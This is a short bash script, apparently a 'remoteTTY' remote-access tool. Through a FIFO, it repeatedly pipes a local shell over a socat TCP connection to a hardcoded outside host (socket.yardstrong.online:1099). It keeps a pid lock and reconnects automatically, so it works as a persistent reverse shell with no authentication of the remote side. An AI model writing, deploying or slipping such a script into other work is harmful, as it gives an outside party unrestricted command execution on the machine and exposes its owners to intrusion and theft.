#!/bin/bash

[ -f "/var/remoteTTY.pid" ] && {
    PS=$(ps |grep $(cat /var/remoteTTY.pid) | grep -v grep | grep remoteTTY)
    if [ -n "$PS" ]
    then
        exit 0
    else
        rm -f /var/remoteTTY.pid
    fi
}

echo $$ > /var/remoteTTY.pid.tmp && mv /var/remoteTTY.pid.tmp /var/remoteTTY.pid

PIPE_PATH="/tmp/remoteTTY.fifo"
SERVER_ADDR=${1-'socket.yardstrong.online'}
SERVER_PORT=${2-1099}

rm -f $PIPE_PATH
mkfifo $PIPE_PATH
exec 3<>$PIPE_PATH

logger -t $0 "connecting cloud server $(date)"

while [[ true ]]; do
        socat -dd - tcp-connect:$SERVER_ADDR:$SERVER_PORT,keepalive,keepidle=60,keepcnt=5,keepintvl=5 <&3 | $SHELL >&3
        logger -t $0 "reconnecting cloud server $(date)"
        sleep 1
done